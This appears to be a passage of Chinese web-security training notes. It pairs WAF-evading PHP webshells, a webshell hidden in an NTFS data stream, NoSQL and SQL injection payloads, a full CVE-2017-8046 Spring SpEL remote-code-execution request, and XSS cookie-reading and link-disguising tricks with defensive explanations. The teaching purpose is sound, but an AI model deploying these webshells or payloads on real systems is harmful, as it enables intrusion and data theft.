##### 免杀 - 定义函数 

- ```php
  <?php
  function a($a) {
      return $a;
  }
  eval(a($_REQUEST)['cmd']);
  ?>
  ```

- 上面的代码通过定义函数的方式将 eval 与 `$_REQUEST` 进行了拆分

- 经测试该代码可以绕过 WAF 的检查

- 通过自定义的函数将 `$_REQUEST` 原样输出，将 `eval` 与 `$_REQUEST` 拆分开 



##### 免杀 - 定义类

- ```php
  <?php
  class User {
      public $name = '';
      function __destruct(){
          eval("$this -> name");
      }
  }
  $user = new User;
  $user -> name = ''.$_REQUEST['cmd'];
  ?>
  ```

- 类在析构的时候会调用 `__destruct()` 方法，而该方法的作用是调用 eval 执行 name 中的内容，name 被赋值为了 `$_REQUEST[‘cmd’]`，也就是说类在析构的时候调用了`eval($_REQUEST[‘cmd’]) `

- 上面的代码通过定义类的魔术方法的方式将  eval 与 `$_REQUEST` 进行了拆分

- 经测试该代码可以绕过 WAF 的检查



##### 免杀 - 多方式传参 

- ```php
  <?php
  $COOKIE = $_COOKIE;
  foreach($COOKIE as $key => $value){
      if($key == 'assert'){
          $key($_REQUEST['cmd']);
      }
  }
  ?>
  ```

- 上面的代码需要结合对脚本的传参才能够发挥Webshell 的作用，是一种比较强的绕过方式。 

- 访问：http://127.0.0.1/test.php?cmd=phpinfo();

  - 需要手动添加 Cookie 字段，携带的内容为 `Cookie: assert=what`
  - 此时脚本就可以进入if判断执行了

- 执行流程

  ![1617877377470](HackerMeWeb.assets/1617877377470.png)



##### 免杀 - 特殊调用

- ```php
  <?php
  $a = get_defined_functions();
  $a['internal'][841]($_REQUEST['cmd']);
  ?>
  ```

- 使用特殊的方式调用 assert 函数 

- 经测试该种方式可以绕过 WAF 的检查 

- 通过 `get_defined_functions()`会得到下面的内容

- `$a[‘internal’][841]` 对应的内容就是 `assert `

  ![1617877658937](HackerMeWeb.assets/1617877658937.png)



#### 隐藏 Webshell 

- 首先需要上传如下的文件并执行 

- ```sh
  <?php
      $file = fopen("/:new.php", "w");
      fwrite($file, "<?php eval(\$_REQUEST[666])?>");
  ?>
  ```

- 该文件执行后会往服务器上写入木马，该木马程序的文件名为/:new.php 

- 但是在该目录下看不到该文件，同时使用 WAF 也扫描不出来 

- 同时我们在该目录下能够构造一个文件包含的场景 

- ```php
  <?php include('/:new.php');?>
  ```

- 访问该文件并对 666 传参的时候，http://127.0.0.1/include.php?666=phpinfo();

- 能够成功的执行木马文件 

- 关键知识点：NTFS 交换数据流 

  - 它是 NTFS 磁盘的一个特性
  - 存在主流文件和非主流文件的区分
  - 主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。
  - 格式 
    - 宿主文件：关联的数据流文件
    - 例如: 1.txt:2.txt, 2.txt寄生在1.txt文件上 
  - 这里所创建的是一个单独的文件流：new.php 

- 这种隐写方式依赖于 NTFS 文件流，因此该种方法只适用于 Windows。 



### NoSQL 注入 

#### NoSQL 注入定义

- NoSQL 泛指非关系型的数据库。随着互联网 Web2.0 网站的兴起，在高可用，高并发压力下，传统数据库已经不能满足需求，用于解决大数据应用和超大规模数据存储的问题。
- 主要代表：MongoDB、 Redis、Memcache 
- MongoDB 
  - MongoDB 是一个面向文档存储的数据库 
  - ![1617889602152](HackerMeWeb.assets/1617889602152.png)
- MongoDB 注入 
- ![1617889655413](HackerMeWeb.assets/1617889655413.png)



#### NoSQL 注入原理

- 要点：

  - `$gt : >`
  - `$lt : <`
  - `$gte: >=`
  - `$lte: <=`
  - `$ne : !=、<>`
  - `$all: all`
  - `$regex `

- 示例：

  - `db.test.find({‘name’: {‘$regex ’: ‘Li.*'} })`
  - `{ "age" : { "$gt" : 3 , "$lt" : 41}}` ，年龄在3到41之间
  - `{ "age" : { "$lte" : 20}}`，年龄小于等于20
  - `{ "age" : { "$ne" : 40}}`， 年龄不等于40 

- SQL语句注入

  - POST上传 ： 
    - `username=test&password=12345 `
  - 程序语言，我们希望是这样执行的： 
    - `db.users.find({ username: ‘test', password: ‘12345’}) `
  - 构造 POST 上传： 
    - `username[$ne]=1&password[$ne]=1 `
  - PHP 解析，实际执行： 
    - `db.logins.find({ username: {$ne:1 }, password {$ne: 1 }) `
  - 最终执行的SQL语句是
    - `SELECT * FROM logins WHERE username <> 1 AND password <> 1 `

- 编程原因漏洞

  - 如果在编程语言中不够谨慎，也可能产生像 SQL 注入那样的截断问题，但是这是在程序语言而非 SQL 语句中：

  - 程序写法： 

  - ```php
    $script=“try{
        var key=db.users.find({ username: ‘test’}).value;
        var inputValue=‘”. $input .”’;
        if(key==inputValue){
        	return (‘match’);
    	}
    }”;
    
    当输入
    ' ; return key; //
    --->  var inputValue=‘’;return key ; //’;
    ```



#### nosqlilab 靶机

- 安装nosqlilab 靶机
- docker pull registry.cn-shanghai.aliyuncs.com/yhskc/nosqlilab 
- docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/nosqlilab 
- docker ps
- docker rename eloquent_driscoll nosqlilab
- 浏览器访问：http://127.0.0.1/



#### NoSQL 注入实战

- Guess The Key  测试
  - 浏览器访问：http://127.0.0.1/guess_the_key.php
  - 输入一个 key 猜测内部的key 是多少
  - 输入 123 测试，http://127.0.0.1/guess_the_key.php?guess=123
    - The server says: 'No match'
  - 输入` ';return key;//` 测试，http://127.0.0.1/guess_the_key.php?guess=';return+key;//
    - The server says: 'Magrathea'
    - 注入原理是基于 编程原因漏洞
  - 源码审计
    - docker exec -it nosqlilab bash
    - vim guess_the_key.php
    - ![1617890428791](HackerMeWeb.assets/1617890428791.png)
- User Lookup  测试
  - 浏览器访问：http://127.0.0.1/user_lookup.php
  - 输入用户名，显示详细信息
  - 输入admin 测试，http://127.0.0.1/user_lookup.php?type=user&username=admin
    - User not found
  - 输入`type[$ne]=user&username[$ne]=admin`，`http://127.0.0.1/user_lookup.php?type[$ne]=user&username[$ne]=admin`
    - 5ee7473c9bdd7d00136a2156: admin - Penny Dog (987)
    - 显示用户信息
    - 注入原理是基于 SQL语句注入
  - 源码审计
    - docker exec -it nosqlilab bash
    - vim user_lookup.php
    - ![1617890710300](HackerMeWeb.assets/1617890710300.png)



#### 防御措施 

- 对输入进行检查
- Web 应用防火墙
- 在编程时顺序结构调整 



### SQL 注入防御

#### SQL 注入形成原因

- 用户能够控制传参
- SQL 语句中拼接了用户传参的内容
- 拼接后的 SQL 语句在数据库中执行
- 总结：用户输入的数据作为代码执行！ 



#### 防御措施 

- 预处理方式 
  - 参数化查询
  - 存储过程
- 过滤方式
  - 白名单
  - 转义



#### 防御措施 - 参数化查询

- 参数化查询是指在设计与数据库连接并访问数据时，在需要填入数值或数据的地方使用参数该给值。 

![1617932558014](HackerMeWeb.assets/1617932558014.png)

- Payload1: ?id=1 and 1=1 
- Payload2: ?id=1’ and 1=1 --+ 
  - 单引号被转义
- Payload3: ?id=1%df’ and 1=1 --+ 
  - 不可识别的字符显示为？,并且单引号被转义

![1617932623658](HackerMeWeb.assets/1617932623658.png)

- 预处理语句：将需要执行的 SQL 语句作为编译过的模板

- `$stmt = $db_connection->prepare("SELECT name FROM users where id = ?");`

  - 这里的？是一个占位符号也可以使用:id的形式进行占位
  - prepare 就是完成语句预处理的过程 

- `$stmt->execute(array($_GET['id']))`

  - execute 使用参数填充占位符，并执行 SQL 语句 

- SQL 注入

  - SQL 注入旨在影响 SQL 语句的编译过程
  - 用户输入的数据中包含了数据库中的关键字，被拼接到 SQL 语句中进行了编译 

- 参数化查询

  - prepare 命令会带着占位符被数据库进行编译和解析，并放到命令缓冲区
  - execute  带着参数调用预编译的命令并解析，但是不会重新编译命令 

- SQL 语句执行示意图

  ![1617932952968](HackerMeWeb.assets/1617932952968.png)

- 下面的 Java 代码使用了 setString 进行了参数的绑定 

  ```java
  String sql="select * from user where id =?";
  preparedStatement statement=connection.prepareStatement(sql);
  statement.setString(1,,"1' or '1'='1");
  Statement.executeQuery();
  ```

  - 进行反编译后查看到的源码文件
  - 通过对不同特殊字符的匹配，进行相应的内容转义，保证 SQL 执行不受到影响
  - ![1617933064889](HackerMeWeb.assets/1617933064889.png)





#### 防御措施 - 存储过程

- 存储过程是指数据库中存放了一组 为完成特定功能的 SQL 语句，这些语句一次编译后永久有效，用户通过指定存储过程的名字并给出参数来执行这些语句。 

- 存储过程 vs 参数化查询

  - 存储过程的 SQL 语句**存放在数据库**中，用户通过调用这些过程获取数据。
  - 参数化查询的 SQL 语句是通过 Web 应用完成执行。 

- 创建一个存储过程方式

  ![1617933269854](HackerMeWeb.assets/1617933269854.png)

- 存储过程的SQL调用

  - 直接使用 call 进行调用

  ![1617933303969](HackerMeWeb.assets/1617933303969.png)

- 存储过程测试

  - Payload: username=Dumb'-- qwe password=fdasfdas 

    ![1617933368796](HackerMeWeb.assets/1617933368796.png)

- 存储过程被创建后存放在表 mysql.proc 中 

  - `select * from mysql.proc \G`

    ![1617933461597](HackerMeWeb.assets/1617933461597.png)

  - 存储过程执行调用函数流程图

    ![1617933556385](HackerMeWeb.assets/1617933556385.png)



#### 防御措施 - 存储过程 + 参数化查询

- 联合两种预处理方式，实现防御

- 执行程序

  ![1617933672308](HackerMeWeb.assets/1617933672308.png)

- SQL 测试

  - Payload1: username:Dumb' -- qwe password:fdasfdas 

  - Payload2: username:Dumb0xdf' -- qwe password:fdasfdas 

    ![1617933709981](HackerMeWeb.assets/1617933709981.png)



#### 防御措施 - 白名单

- 只接受来自白名单中规定的传参内容，白名单之外的内容直接丢弃。

- 该种方法适用于传参内容可以穷举，且不频繁变化的场景。 

- 下拉菜单模式

  - 用户通过下拉菜单的方式进行输入

  - 后端接收到用户传参之后，进行校验 

  - ```javascript
    string value;
    
    switch(case):
        case 1:value='a';break;
        case 2:value='b';break;
        //...
        default:输入内容不合法
    ```

- 转换为布尔值

  - 对于某些简单的操作，比如排序。可以将用户的传参转换为布尔值，而不是直接使用用户的传参 
  - `concat(“select username from users order by salary ”,”(sortOrder?'ASC':'DESC')”); `



#### 防御措施 - 转义

- 对用户输入的特殊字符进行转义，这些字符可能会影响 SQL 代码的执行。 

- 不信任用户输入的数据，对用户输入的数据进行转义后在代入程序中执行。 

- 转义的方案根据数据库的不同会有所差异。 

- MySQL 转义 

  - | 转义序列 | 字符      | 说明                                         |
    | -------- | --------- | -------------------------------------------- |
    | \0       | NULL字符  |                                              |
    | \’       | 单引号    | 闭合程序中的单引号                           |
    | \”       | 双引号    | 闭合程序中的双引号                           |
    | \b       | 退格      | 覆盖文本内容                                 |
    | \n       | 换行      |                                              |
    | \r       | 回车      |                                              |
    | \t       | 制表符    |                                              |
    | \Z       | Contorl+Z | 在Windows上代表END-OF-FILE                   |
    | \\       | 反斜杠    | 可以用作转义，转义系统中对用户输入内容的转义 |
    | \%       | %         | 可以作为通配符                               |
    | \_       | _         | 可以作为通配符                               |

- 十六进制 

  - 正常 SQL 命令
    - 用户传参  id=3324
    - 执行命令  select * from users where id='3324' 
  - 恶意 SQL 命令 
    - 用户传参  id= ' union select database() 
    - 执行命令  select * from users where id= '' union select database() 
  - 正常 SQL 命令（十六进制编码） 
    - 用户传参  id=3324
    - 执行命令  select * from users where hex(id)='33333234' 
  - 恶意 SQL 命令 （十六进制编码） 
    - 用户传参  id= ' union select database() 
    - 执行命令  select * from users where hex(id)='201920756E696F6E2073656C6563742064617461626173652829' 



### 加密算法与随机数 

#### 哈希算法 

- 哈希算法也叫作散列，能够把一个任意长度的数通过对应的算法转变为指定长度的数 
- `s[0]*31^(n-1) + s[1]*31^(n-2) + ... + s[n-1] `
- 这里演示了取余操作也是一种哈希计算。作为一种哈希算法，取的余就是哈希值。
- 哈希算法通常计算快捷，多用于编程语言中底层，定位数据存储位置。
- 网盘秒传就是基于哈希算法实现的。
- 哈希算法具体如何算根据不同的需求，单独定制。 
- ![1617935774589](HackerMeWeb.assets/1617935774589.png)



#### 哈希算法（MD5） 

- 无论是外部攻击泄露还是内部员工窃取，MD5 算法作为一种首要的防范 SQL 注入导致的信息泄露，被广泛地应用。但是 MD5 本身不能保证绝对的安全性，比如下图用 sqlmap 自带字典的跑出的密码。 
- ![1617935892386](HackerMeWeb.assets/1617935892386.png)
- 我们一般登录过程中，是外部输入的密码。在程序中进行 MD5 计算然后和数据存储的密码进行比对。所以一般来讲，数据库中不存储真实的密码，防止真实密码泄露。 
- ![1617935939852](HackerMeWeb.assets/1617935939852.png)
- MD5 的问题 
  - https://www.cmd5.com/
  - ![1617935966498](HackerMeWeb.assets/1617935966498.png)
  - 随着MD5使用时间越长，一些人专门收集相应的 MD5 值，导致 MD5 本身越来越危险，
  - 以前的只需要英文字母的密码存储即便使用了 MD5 加密，也形同虚设。
  - 所以在现在的网站及 APP 等等，我们一般要求增加密码长度，密码大小写，特殊字符，数字来增加密码的安全性。 
- MD5 破解失败 
  - 下方是集合了大小写特殊字符的密码，下面是密码的 MD5 值，
  - 所以在这个角度，前后端开发人员在设计账号注册功能的时候要注意复杂度的问题。 
  - ![1617936123178](HackerMeWeb.assets/1617936123178.png)
- 百度账号注册 
  - 只是使用26个英文字母，8位密码
    - 26^8≈ 2088亿 
  - 使用大小写，+10个数字
    - （26*2+10）^8≈ 218.34 万亿 
  - 使用大小写，+10个数字，+16个特殊字符
    - （26*2+10+16）^8≈ 1730.11 万亿 



#### 加密算法 

- 对原来为明文的文件或数据按某种方式进行编码，使其成为不可读或者无明确含义的文本信息，使其只能在输入相应的密钥之后才能显示出原始信息。通过这样的途径来达到保护数据不被非法人窃取、阅读的目的。
- 加密算法在于能够获取原始信息，MD5 理论上是不可以的。MD5 解密并不是一个逆向的过程 而是在彩虹表或者数据库里恰好有这个值。 
- 随机数
  - 随机数具有随机性，不可预测性，不可重现性 这三种特性，
  - 常用于：生成密钥，防止重放攻击。 
- 秘钥
  - 用于完成加密，解密，完整性验证等密码学应用的秘密信息
  - 与加密算法一同决定了密文生成结果。 
- 通俗地讲，密钥是加解密算法的一个参，与加密算法共同作用下产生密文，相反，解密也需要密钥才能得出正确的明文信息。
- 重放攻击是：入侵者从网络上截取主机 A 发送给主机 B 的报文，并把由 A加密的报文发送给 B，使主机 B 误以为入侵者就是主机 A，然后主机 B 向伪装成 A 的入侵者发送应当发送给 A 的报文。 
- 对称加密算法
  - 对称加密用同一套密钥，加密速度快。
  - 对称 DES 3DES AES 
  - ![1617936485024](HackerMeWeb.assets/1617936485024.png)
- 非对称加密算法
  - 公钥 + 私钥
  - ![1617936535065](HackerMeWeb.assets/1617936535065.png)
- 实际加密算法的使用情况 
  - 实际传输的信息：密文、对称密钥的密钥、数字签名、数字证书
  - ![1617936648593](HackerMeWeb.assets/1617936648593.png)



## 框架安全 

### CVE

- CVE- Common Vulnerabilities & Exposures
- 广泛认同的信息安全漏洞或者已经暴露出来的弱点给出的一个公共名称。
- 认定的一般流程：
  - 发现—>公开—>编号—>提案—>修改—>中间决策—>最终决策—>正式发布—>（再评估）—>（撤销） 
- 官网：https://cve.mitre.org/



### 框架安全

- 随着应用开发的复杂度提升，很难再有完全从零开发的web应用，而更多的是使用web框架，很大一部分开源框架得到了全世界的开发者支持，具备更加强大功能和完善的支持。
- 正因如此，开源的框架使用的范围越来越广，最大程度的减小了网站开发的难度和时间。
- 但是开源框架的问题在于，他的源码被全世界的开发者所阅读，小型框架的漏洞非常容易被人发现，而大型框架也不意味着安全，复杂的调用关系并不能杜绝漏洞被人所发现。
- 一旦一个大型框架出现漏洞，那么黑客相当于拿到了所有使用这个框架的网站的通行证。几乎所有的大型框架都出现过漏洞，影响范围非常广。 
- 常见的框架与漏洞
  - struct2 作为曾经世界上最流行的 Java Web框架之一，广泛应用于教育、金融、互联网、通信等重要行业，直到目前仍然被大量使用。
    - Struct2 ： CVE-2018-11776 远程代码执行漏洞 高危
  - spring 是目前基于java的最流行的框架，大部分的java大型项目都直接或间接的使用了spring 框架。
    - Spring ： CVE-2017-8046 远程代码执行漏洞 高危
  - ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架, 5.1.23之前版本中存在SQL注入漏洞。
    - Thinkphp:   CVE-2018-16385 SQL 注入  高危
  - django 是python 方向企业级框架，是开发者的首选框架。
    -  Django ： CVE-2020-7471 SQL 注入  高危 



### spring-data-rest 靶机

- 启动 docker
- docker pull registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest
- docker run -d -p 0.0.0.0:80:8080 registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest
- docker ps
- docker rename compassionate_northcutt spring-data-rest



### spring-data-rest (CVE-2017-8046) 

- CVE-2017-8046 是代码审计和分析的信息服务公司Semmle发现并提交的漏洞 

- Spring Data Rest设计的目的是消除curd的模板代码，减少程序员的刻板的重复劳动,增删改查动作分别对应四种请求类型：post、delete、update/patch、get。

- Spring 3.2 开始支持 PATCH 方法，但要选对部署的容器。

- op代表操作，必须存在，只能由6种明确表示操作的词汇组成，每一个操作结果作为下一个操作的对象，如果发生错误即返回错误信息，则全部变更不生效,成功返回204。 

- PATCH

  - PATCH 方法是 HTTP 协议新引入的，是对 PUT 方法的补充，使用 JSON 格式数据来对已知资源进行局部更新。 由 RFC6902 所约束，需包含 path 和 op 字段，具有自己的 MIME 类型：application/json-patch+json。 

  - ![1617974623774](HackerMeWeb.assets/1617974623774.png)

  - json 格式

    - ```json
      // 一个 JSON 文档 A ：
      {
      	"foo": "bar"
      }
      
      // 文档 A
      {
          "foo": "bar",
          "baz": "qux"
      }
      ```

  - PATCH 简单示例

    - ![1617974774405](HackerMeWeb.assets/1617974774405.png)

- spring-data-rest 源码地址

  - https://github.com/spring-guides/gs-accessing-data-rest

- 靶机测试 curl

  - 添加用户
    - curl -X POST -H "Content-Type: application/json-patch+json" -d '{"firstname":"rm","lastname":"liu"}' http://127.0.0.1/customers
  - 删除用户
    - curl -X DELETE -H "Content-Type: application/json-patch+json" -d '{"firstname":"rm","lastname":"liu"}' http://127.0.0.1/customers/2
  - 备注：这两个操作，我本机测试失败了，不知道原因！

- 靶机测试 BurpSuite 

  - 使用 BurpSuite 拦截请求报文 

    - 需要设置浏览器代理
    - 如果域名无法解析，需要使用 switchhost 工具

  - 浏览器访问下面链接

    - http://xforburp.com/
    - http://xforburp.com/customers
    - http://xforburp.com/customers/1

  - 在 burp 中可以看到对应的三条记录

  - 将 http://xforburp.com/customers/1 请求，对应的内容右键发送到 Repeater 中，可以看到请求的内容为

    - ```http
      GET /customers/1 HTTP/1.1
      Host: xforburp.com
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Connection: close
      Cookie: security_level=0
      Upgrade-Insecure-Requests: 1
      ```

  - 更改GET请求为PATCH请求，并添加上Content-Type，附加上 op，更改后的内容为

    - ```http
      PATCH /customers/1 HTTP/1.1
      Host: xforburp.com
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Connection: close
      Cookie: security_level=0
      Upgrade-Insecure-Requests: 1
      Content-Type: application/json-patch+json
      
      [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "test" }]
      ```

  - 点击 Send，此时可以获得结果

  - 登录 bash 交互式环境

    - docker exec -it spring-data-rest bash
    - cd /tmp/
    - ls -al
      - 此时，可以看到一个刚刚创建的文件 success
      - 此时就完成了漏洞利用
    - ![1617976269822](HackerMeWeb.assets/1617976269822.png)
    
  - 请求报文剖析 
  
    - 一串数字，116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115 
    - 对应的命令为，`touch /tmp/success ` ，所以才会创建一个 新的目录



### CVE-2017-8046 源码下载

- 源码下载
  - 下载eclipse，安装反编译插件，
  - 在市场（搜索 market）可以搜索 decompile 第一是反编译的，下载
  - References - General－Editor－File Associations－修改class文件、class without source文件打开方式，下方 选择decompile viewer，并设置成默认
  - 本文所用示例为spring官方教程, 仅版本修改至1.5.6.release 有漏洞的版本， 
- 备注
  - 我直接在 github 上下载程序，https://github.com/spring-guides/gs-accessing-data-rest
  - 内部pom依赖使用了 1.5.6.release  版本，直接 intellJ 加载complete，就可以看到源码信息
  - 可以通过直接修改 pom 文件中的 version，更改版本号



### CVE-2017-8046 漏洞调试

- 阅读源码，程序调试

  - 项目引入 1.5.6.RELEASE 版本

    - ```xml
          <parent>
              <groupId>org.springframework.boot</groupId>
              <artifactId>spring-boot-starter-parent</artifactId>
              <version>1.5.6.RELEASE</version>
          </parent>
      ```

  - 进入文件，org.springframework.data.rest.webmvc.config.PersistentEntityResourceHandlerMethodArgumentResolver#readPatch

    - 可见 `JsonPatchHandler handler = new JsonPatchHandler(mapper, reader);`
    - JsonPatchHandler 处理器用于处理 HTTP Json Patch 类型请求 

  - 进入 apply 方法，org.springframework.data.rest.webmvc.config.JsonPatchHandler#apply

    - 可见 

      ```java
      if (request.isJsonPatchRequest()) {
          return applyPatch(request.getBody(), target);
      } else {
          return applyMergePatch(request.getBody(), target);
      }
      
      
      // org.springframework.data.rest.webmvc.IncomingRequest#isJsonPatchRequest
      	/**
      	 * Returns whether the request is a PATCH request with a payload of type {@link RestMediaTypes#JSON_PATCH_JSON}.
      	 * 
      	 * @return
      	 */
      	public boolean isJsonPatchRequest() {
      		return isPatchRequest() && RestMediaTypes.JSON_PATCH_JSON.isCompatibleWith(contentType);
      	}
      ```

    - 用于判断是否为 JsonPatch 的请求 

  - 进入applyPatch 方法，org.springframework.data.rest.webmvc.config.JsonPatchHandler#applyPatch

    - ```java
      	@SuppressWarnings("unchecked")
        	<T> T applyPatch(InputStream source, T target) throws Exception {
        		return getPatchOperations(source).apply(target, (Class<T>) target.getClass());
        	}
        
      // org.springframework.data.rest.webmvc.config.JsonPatchHandler#getPatchOperations
      	/**
      	 * Returns all {@link JsonPatchOperation}s to be applied.
      	 * 
      	 * @param source must not be {@literal null}.
      	 * @return
      	 * @throws HttpMessageNotReadableException in case the payload can't be read.
      	 */
      	private Patch getPatchOperations(InputStream source) {
      
      		try {
      			return new JsonPatchPatchConverter(mapper).convert(mapper.readTree(source));
      		} catch (Exception o_O) {
      			throw new HttpMessageNotReadableException(
      					String.format("Could not read PATCH operations! Expected %s!", RestMediaTypes.JSON_PATCH_JSON), o_O);
      		}
      	}
      ```

    - 上面的方法有两块内容，一个是获取含有Payload的 path 并且转变为spel表达式，就是下面的方法，另一个就是对前面返回的值进行 具体执行。

    - Spring Expression Language（缩写为 SpEL ）是一种强大的表达式语言。支持在运行时查询和操作对象，它可以与基于 XML 和基于注解的 Spring 配置还有 Bean 定义一起使用。  

  - 进入 convert 方法，org.springframework.data.rest.webmvc.json.patch.JsonPatchPatchConverter#convert(com.fasterxml.jackson.databind.JsonNode)

    - ```java
      public Patch convert(JsonNode jsonNode) {
      
      		if (!(jsonNode instanceof ArrayNode)) {
      			throw new IllegalArgumentException("JsonNode must be an instance of ArrayNode");
      		}
      
      		ArrayNode opNodes = (ArrayNode) jsonNode;
      		List<PatchOperation> ops = new ArrayList<PatchOperation>(opNodes.size());
      
      		for (Iterator<JsonNode> elements = opNodes.elements(); elements.hasNext();) {
      
      			JsonNode opNode = elements.next();
      
      			String opType = opNode.get("op").textValue();
      			String path = opNode.get("path").textValue();
      
      			JsonNode valueNode = opNode.get("value");
      			Object value = valueFromJsonNode(path, valueNode);
      			String from = opNode.has("from") ? opNode.get("from").textValue() : null;
      
      			if (opType.equals("test")) {
      				ops.add(new TestOperation(path, value));
      			} else if (opType.equals("replace")) {
      				ops.add(new ReplaceOperation(path, value));
      			} else if (opType.equals("remove")) {
      				ops.add(new RemoveOperation(path));
      			} else if (opType.equals("add")) {
      				ops.add(new AddOperation(path, value));
      			} else if (opType.equals("copy")) {
      				ops.add(new CopyOperation(path, from));
      			} else if (opType.equals("move")) {
      				ops.add(new MoveOperation(path, from));
      			} else {
      				throw new PatchException("Unrecognized operation type: " + opType);
      			}
      		}
      ```

    - 在漏洞测试过程中，`ArrayNode =[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastName","value": "test" }]`

    - 遍历PATCH方法发送上去的数据， 生成对应的操作对象，下面所有操作对象如 ReplaceOperation继承自抽象类 PatchOperation。 

  - 进入PatchOperation 类 ，org.springframework.data.rest.webmvc.json.patch.PatchOperation

    - ```java
      public abstract class PatchOperation {
      
          public PatchOperation(String op, String path, Object value) {
      
              this.op = op;
              this.path = path;
              this.value = value;
              this.spelExpression = pathToExpression(path);
          }
      }
      ```

    - 在上一个页面中 ，创建了 replaceOperation对象并且的进行了初始化，初始化代码在这里。这里对 path 的值包含了我们上传的payload，这里把path经过转换赋值给spelExpression。

    - 因为对输入路径进行了转换，以及payload构造依赖的逻辑就在内部。 

  - 进入applyPatch 方法中调用的 apply 方法，org.springframework.data.rest.webmvc.json.patch.Patch#apply(T, java.lang.Class<T>)

    - ```java
      	public <T> T apply(T in, Class<T> type) throws PatchException {
        
        		for (PatchOperation operation : operations) {
        			operation.perform(in, type);
        		}
        
        		return in;
        	}
      ```

    - 在回过头看 apply，

    - 在最下面一步的时候spelExpression expression值包含了Payload 此前经过转换，斜杠已经变成点

    - 在正常情况下， expression应该只包含 lastname 然后用spel表达式对下面的lastname Li 进行替换，替换的值为test 

    - ![1618024702239](HackerMeWeb.assets/1618024702239.png)

    - 命令执行漏洞利用成功

      - `people1:lastName="#{T(java.lang.Runtime).getRuntime().exec("touch /tmp/success").lastName}" `
      - 上面是在这里通过 spel表达式产生命令执行漏洞的实际语句。 



### CVE-2017-8046 漏洞修复

- 在1.5.7 版本中就对漏洞进行了修复，PatchOperation 类的 evaluateValueFromTarget 方法里面加入了verifyPath, 对路径的有效性做了验证，主要过滤了数字 。 
- org.springframework.data.rest.webmvc.json.patch.PatchOperation#evaluateValueFromTarget
- ![1618025036520](HackerMeWeb.assets/1618025036520.png)



### 官方漏洞网站

- 关注官方网站，及时追踪更新。
- CVE 
  - https://cve.mitre.org/
- Exploit Database 
  - https://www.exploit-db.com
- ZERODIUM 
  - https://zerodium.com/





## 前端安全

### XSS 

#### XSS（跨站脚本攻击）

OWASP Top10 2017 第七，浏览器将用户输入的内容，当做脚本执行，执行了恶意的功能，这种针对用户浏览器的攻击即跨站脚本攻击。

主要分为三种类型：

- 反射型
- 存储型
- DOM 型  



#### XSS 危害

- 盗取 Cookie
- 盗取账户
- 恶意软件下载
- 键盘记录
- 广告引流等等 
- JavaScript 能够写出的任意恶意功能 



### 反射型 XSS

#### 定义

应用程序或 API 包括未经验证和未经转义的用户输入， 直接作为 HTML 输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的 HTML 和 JavaScript 。

特点：非持久化，必须用户点击带有特定参数的链接才能引起。

影响范围：仅执行脚本的用户。 



#### GET 测试

- 安装 bWAPP 靶机，启动，进入浏览器，输入 http://127.0.0.1/portal.php ，登录

- Choose your bug:

  - Cross-Site Scripting - Reflected (GET)

- 测试输入

  - First name:
    - TE
  - Last name:
    - test

- 测试展示

  - Welcome TE test

- 脚本输入

  - <script>alert(1);</script>

  - test

- 脚本展示

  - 弹出对话框 1，并且可以点击确定
  - 可以点击查看页面元素，此时的JavaScript脚本被浏览器执行

- 跳转脚本输入

  - <script>alert("点击确定修复");location.href="https://www.baidu.com"</script>

  - test

- 跳转脚本展示

  - 弹出 点击确定修复 对话框，并且可以点击确定
  - 此时浏览器的页面就会跳转到新的百度首页

- cookie 获取脚本输入

  - <script>alert(document.cookie);</script>

  - test

- cookie 获取脚本展示

  - 弹出对话框，展示的内容是 cookie的值，为 csrftoken=ARDPhdClAyvSmEJcAmE953XMbXI527GrUDAbbHZ1sIpUwsYaW8MBwDaFBd4ksUu1; security_level=0; PHPSESSID=hgj7ffva55bcajadb9u6nnmi62
  - 并且可以直接点击



#### 短链接实现

- 在跳转的时候，一般浏览器的地址栏中会有一长串的内容，用户是否会起疑心呢？
- 例如 跳转脚本输入 的时候，浏览器的地址栏内容为：http://127.0.0.1/xss_get.php?firstname=%3Cscript%3Ealert%28%22%E7%82%B9%E5%87%BB%E7%A1%AE%E5%AE%9A%E4%BF%AE%E5%A4%8D%22%29%3Blocation.href%3D%22https%3A%2F%2Fwww.baidu.com%22%3C%2Fscript%3E&lastname=test&form=submit
-   可以用 https://www.985.so/ 该网站，将上述长链接压缩为 http://b9q.net/b11zc
- 将上述连接输入到 浏览器网址就会出现 跳转脚本输入 的场景



#### HREF 测试

- 安装 bWAPP 靶机，启动，进入浏览器，输入 http://127.0.0.1/portal.php ，登录
- Choose your bug:
  - Cross-Site Scripting - Reflected (HREF)
- 测试输入
  - name
  - 此时，就会展示出一个电影列表，可以进行相应的投票
- 弹出 XSS 测试
  - 输入： <script>alert(1);</script>
  - 此时并没有弹出框，是因为JavaScript脚本被放到了 p 标签中，导致将其解析为文本内容，无法执行
  - 解决办法：闭合标签大法，闭合前面的 p 标签就可以
  - 输入：</p><script>alert(1);</script><p>
  - 此时，就会出现一个弹出框，并且可以点击确定，并且会一直处于需要点击的过程中，也就被卡死了



#### 限制与防御

- 危害范围相对较小，危险程度相对来说是比较小的
- 多为一次点击触发一次
